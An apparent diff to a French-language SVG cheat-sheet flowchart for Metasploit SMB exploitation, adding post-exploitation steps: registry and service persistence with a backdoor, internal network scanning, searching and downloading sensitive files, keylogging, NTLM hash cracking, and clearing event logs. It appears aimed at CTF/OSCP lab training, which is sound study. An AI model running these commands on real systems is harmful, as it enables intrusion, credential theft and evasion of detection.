@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<svg width="1890" height="4655" viewBox="0 0 1890 4655"
+<svg width="1890" height="5820" viewBox="0 0 1890 5820"
      xmlns="http://www.w3.org/2000/svg">
 <defs>
   <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto" fill="#484f58">
     <polygon points="0 0, 10 3.5, 0 7" />
   </marker>
 </defs>
-<rect width="1890" height="4655" fill="#0d1117"/>
+<rect width="1890" height="5820" fill="#0d1117"/>
 <text x="945.0" y="28" text-anchor="middle" font-family="Segoe UI, sans-serif"
       font-size="13" font-weight="bold" fill="#8b949e">SMB ENUMERATION — METASPLOIT FRAMEWORK EDITION</text>
 
@@ -412,6 +412,84 @@
 <text x="1324" y="1162" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
 <text x="1316" y="1182" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 Windows 7/2008 R2 non patché. Très courant en CTF/OSCP.</text>
 
+<!-- ═══ STEP 12: PERSISTENCE ═══ -->
+<rect x="673" y="4643" width="540" height="360" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="4640" width="540" height="360" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="670" y="4640" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="670" y="4668" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1139.0" y="4648" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="1169.5" y="4662" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="686" y="4664" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">12. Persistence (Maintenir l'accès)</text>
+<rect x="686" y="4688" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="4704" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Service metsvc (bind port 31337) :</text>
+<text x="694" y="4720" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; run metsvc</text>
+<text x="694" y="4736" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Reconnexion via multi/handler :</text>
+<text x="694" y="4752" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># PAYLOAD windows/metsvc_bind_tcp LPORT 31337</text>
+<rect x="686" y="4768" width="500" height="120" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="4784" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Module persistence (recommandé) :</text>
+<text x="694" y="4800" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use exploit/windows/local/persistence</text>
+<text x="694" y="4816" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SESSION &lt;ID&gt;</text>
+<text x="694" y="4832" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set LHOST &lt;TON_IP&gt;</text>
+<text x="694" y="4848" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set LPORT 4445</text>
+<text x="694" y="4864" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set STARTUP SYSTEM</text>
+<text x="694" y="4880" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="686" y="4896" width="500" height="56" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="4912" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Clé de registre Run :</text>
+<text x="694" y="4928" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; reg setval -k HKLM\\...\\Run</text>
+<text x="694" y="4944" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">  -v Updater -d &quot;C:\\backdoor.exe&quot;</text>
+<text x="686" y="4968" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 metsvc est deprecated. Préférer le module persistence.</text>
+
+<!-- ═══ STEP 13: RECON RESEAU ═══ -->
+<rect x="673" y="5043" width="540" height="315" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="5040" width="540" height="315" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="670" y="5040" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="670" y="5068" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1139.0" y="5048" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="1169.5" y="5062" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="686" y="5064" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">13. Recon Réseau Post-Exploitation</text>
+<rect x="686" y="5088" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="5104" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Interfaces et routes :</text>
+<text x="694" y="5120" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; ifconfig</text>
+<text x="694" y="5136" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; route</text>
+<text x="694" y="5152" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; arp</text>
+<rect x="686" y="5168" width="500" height="56" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="5184" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Scanner le réseau local :</text>
+<text x="694" y="5200" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; run arp_scanner -r &lt;SUBNET&gt;/24</text>
+<text x="694" y="5216" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; run post/multi/gather/ping_sweep</text>
+<rect x="686" y="5232" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="5248" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Connexions actives et services :</text>
+<text x="694" y="5264" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; netstat</text>
+<text x="694" y="5280" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; run post/windows/gather/enum_shares</text>
+<text x="694" y="5296" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; run post/windows/gather/enum_domain</text>
+<text x="686" y="5320" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 autoroute + arp_scanner = cartographie du réseau interne.</text>
+
+<!-- ═══ STEP 14: EXFILTRATION & CRACKING ═══ -->
+<rect x="673" y="5398" width="540" height="375" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="5395" width="540" height="375" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="670" y="5395" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="670" y="5423" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1139.0" y="5403" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="1169.5" y="5417" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="686" y="5419" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">14. Exfiltration &amp; Cracking de Hashes</text>
+<rect x="686" y="5443" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="5459" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Chercher des fichiers sensibles :</text>
+<text x="694" y="5475" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; search -f *.pdf -d C:\\Users</text>
+<text x="694" y="5491" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; search -f *password* -d C:\\</text>
+<text x="694" y="5507" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; search -f *.kdbx -d C:\\</text>
+<rect x="686" y="5523" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="5539" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Télécharger / Captures :</text>
+<text x="694" y="5555" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; download C:\\Users\\...\\secret.pdf</text>
+<text x="694" y="5571" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; screenshot</text>
+<text x="694" y="5587" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; keyscan_start</text>
+<rect x="686" y="5603" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="5619" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Cracker hashes NTLM (offline) :</text>
+<text x="694" y="5635" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">hashcat -m 1000 &lt;NTLM_HASH&gt; rockyou.txt</text>
+<text x="694" y="5651" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">john --format=NT hashes.txt</text>
+<text x="694" y="5667" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># LM vide  = aad3b435b51404eeaad3b435b51404ee</text>
+<text x="694" y="5683" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># NTLM vide = 31d6cfe0d16ae931b73c59d7e0c089c0</text>
+<text x="686" y="5707" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 keyscan_dump pour récupérer les frappes clavier.</text>
+<text x="686" y="5727" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 clearev pour nettoyer les logs (attention, suspect !).</text>
+
 <!-- ═══ ARROWS ═══ -->
 <path d="M 940.0 215 L 940.0 244" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
 <path d="M 940.0 549 L 940.0 578" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
@@ -471,5 +549,9 @@
 <path d="M 670 3714.0 L 625 3714.0 L 625 3769 L 310.0 3769 L 310.0 3778" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
 <rect x="631.5" y="3693.0" width="32" height="18" rx="4" fill="#da3633" fill-opacity="0.2"/>
 <text x="647.5" y="3706.0" text-anchor="middle" font-family="monospace" font-size="11" font-weight="bold" fill="#da3633">NON</text>
+
+<path d="M 940.0 4605 L 940.0 4634" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 940.0 5000 L 940.0 5034" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 940.0 5355 L 940.0 5389" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
 
 </svg>
